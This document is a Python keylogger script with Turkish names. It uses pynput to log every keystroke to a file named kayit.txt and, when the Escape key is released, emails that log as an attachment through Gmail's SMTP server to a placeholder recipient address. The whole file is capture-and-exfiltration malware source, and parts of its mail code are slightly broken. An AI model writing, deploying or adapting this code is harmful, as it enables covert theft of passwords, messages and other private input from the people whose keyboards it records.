import pynput
import re
from pynput.keyboard import Key,Listener
import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def mail():
    konu = "Keylogger Dosyası"
    kimden = "self.mail"
    sifre = "self.sifre"
    kime = "to.mail"
    mesaj = "Dosya ektedir."

    context = ssl.create_default_context()

    posta = MIMEMultipart()
    posta["From"] = kimden
    posta["To"] = kime
    posta["Subject"] = konu

    posta.attach(MIMEText(mesaj, "plain"))

    eklenti_dosya_ismi = "kayit.txt"

    with open(eklenti_dosya_ismi, "rb") as dosya:
        payload = MIMEBase("application", "octate-stream")
        payload.set_payload((dosya).read())
        encoders.encode_base64(payload)

        payload.add_header("Content-Decomposition", "attachment", filename = dosya)
        posta.attach(payload)

        posta_str = posta.as_string()

    port = 465
    host = "smtp.gmail.com"

    eposta_sunucu = smtplib.SMTP_SSL(host = host, port = port, context = context)
    eposta_sunucu.login(kimden, sifre)
    eposta_sunucu.sendmail(kimden, kime, posta_str)

count = 0
keys = []

def on_press(key):
    global count,keys
    count += 1
    print(f"{key} tuşuna basıldı")
    keys.append(key)

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        print("exit")
        mail()
        return False

def write_file(keys):
    with open("kayit.txt" , "a" , encoding="utf-8") as file:
        for i in keys:
            k = str(i).replace("'", "")
            if k == "Key.space":
                file.write("\n")
                continue
            if len(re.findall("Key.", str(i))) >= 1:
                file.write(f'"{str(i)}"')
            else:
                file.write(k)

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()